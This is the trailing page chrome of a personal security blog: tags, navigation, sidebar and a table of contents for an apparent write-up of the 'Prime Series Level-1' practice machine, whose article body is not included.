</article><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/wordpress/">wordpress</a><a class="post-meta__tags" href="/tags/OpenSSL-Decryption/">OpenSSL Decryption</a></div><div class="post_share"></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/07/31/20240719-AdmX-new/" title="20240719 AdmX_new"><img class="cover" src="/img/10.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">Previous</div><div class="prev_info">20240719 AdmX_new</div></div></a></div><div class="next-post pull-right"><a href="/2024/07/14/20240714-SickOs1-1/" title="20240714 SickOs1.1"><img class="cover" src="/img/8.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next</div><div class="next_info">20240714 SickOs1.1</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><div><a href="/2024/07/31/20240719-AdmX-new/" title="20240719 AdmX_new"><img class="cover" src="/img/10.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-07-31</div><div class="title">20240719 AdmX_new</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/w700d1q75cms.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Ethan</div><div class="author-info__description">Share my experience with shooting machines, urge myself to learn, and update regularly</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">12</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">17</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">16</div></a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#20240719-Prime-Series-Level-1"><span class="toc-number">1.</span> <span class="toc-text">20240719  Prime_Series_Level-1</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Host-Discovery"><span class="toc-number">1.1.</span> <span class="toc-text">Host Discovery</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Port-Scanning"><span class="toc-number">1.2.</span> <span class="toc-text">Port Scanning</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Directory-Scanning"><span class="toc-number">1.3.</span> <span class="toc-text">Directory Scanning</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#WFUZZ-Usage-Method"><span class="toc-number">1.3.0.1.</span> <span class="toc-text">WFUZZ Usage Method</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Vulnerability-Discovery-%EF%BC%9A"><span class="toc-number">1.4.</span> <span class="toc-text">Vulnerability Discovery:：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Arbitrary-File-Inclusion"><span class="toc-number">1.4.1.</span> <span class="toc-text">Arbitrary File Inclusion</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WordPress-backend-vulnerability"><span class="toc-number">1.4.2.</span> <span class="toc-text">WordPress backend vulnerability</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Privilege-Escalation-Method-One"><span class="toc-number">1.5.</span> <span class="toc-text">Privilege Escalation Method One</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Kernel-Privilege-Escalation"><span class="toc-number">1.5.1.</span> <span class="toc-text">Kernel Privilege Escalation</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Privilege-Escalation-Method-Two"><span class="toc-number">1.6.</span> <span class="toc-text">Privilege Escalation Method Two</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Information-Gathering"><span class="toc-number">1.6.1.</span> <span class="toc-text">Information Gathering</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#OpenSSL-Decryption"><span class="toc-number">1.6.2.</span> <span class="toc-text">OpenSSL Decryption</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#String-Processing"><span class="toc-number">1.6.2.1.</span> <span class="toc-text">String Processing</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Decryption"><span class="toc-number">1.6.2.2.</span> <span class="toc-text">Decryption</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Privilege-Escalation"><span class="toc-number">1.6.3.</span> <span class="toc-text">Privilege Escalation</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2024/08/09/20240808-ctf7/" title="20240808 ctf7"><img src="/img/12.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="20240808 ctf7"/></a><div class="content"><a class="title" href="/2024/08/09/20240808-ctf7/" title="20240808 ctf7">20240808 ctf7</a><time datetime="2024-08-09T03:28:53.000Z" title="Created 2024-08-09 11:28:53">2024-08-09</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/08/09/20240808-ctf5/" title="20240808 ctf5"><img src="/img/11.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="20240808 ctf5"/></a><div class="content"><a class="title" href="/2024/08/09/20240808-ctf5/" title="20240808 ctf5">20240808 ctf5</a><time datetime="2024-08-09T03:28:48.000Z" title="Created 2024-08-09 11:28:48">2024-08-09</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/07/31/20240719-AdmX-new/" title="20240719 AdmX_new"><img src="/img/10.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="20240719 AdmX_new"/></a><div class="content"><a class="title" href="/2024/07/31/20240719-AdmX-new/" title="20240719 AdmX_new">20240719 AdmX_new</a><time datetime="2024-07-31T15:59:59.000Z" title="Created 2024-07-31 23:59:59">2024-07-31</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/07/31/20240719-Prime-Series-Level-1/" title="20240719  Prime_Series_Level-1"><img src="/img/9.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="20240719  Prime_Series_Level-1"/></a><div class="content"><a class="title" href="/2024/07/31/20240719-Prime-Series-Level-1/" title="20240719  Prime_Series_Level-1">20240719  Prime_Series_Level-1</a><time datetime="2024-07-31T15:59:58.000Z" title="Created 2024-07-31 23:59:58">2024-07-31</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/07/14/20240714-SickOs1-1/" title="20240714 SickOs1.1"><img src="/img/8.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="20240714 SickOs1.1"/></a><div class="content"><a class="title" href="/2024/07/14/20240714-SickOs1-1/" title="20240714 SickOs1.1">20240714 SickOs1.1</a><time datetime="2024-07-14T14:06:38.000Z" title="Created 2024-07-14 22:06:38">2024-07-14</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('/img/9.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2024 By Ethan</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">Hi, welcome to my <a target="_blank" rel="noopener" href="https://butterfly.js.org/">blog</a>!</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="Toggle Between Traditional Chinese And Simplified Chinese">繁</button><button id="darkmode" type="button" title="Toggle Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="/js/tw_cn.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page@5.2.0/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar@0.1.16/dist/snackbar.min.js"></script><div class="js-pjax"></div><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/canvas-nest.min.js"></script><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/click-heart.min.js" async="async" mobile="true"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>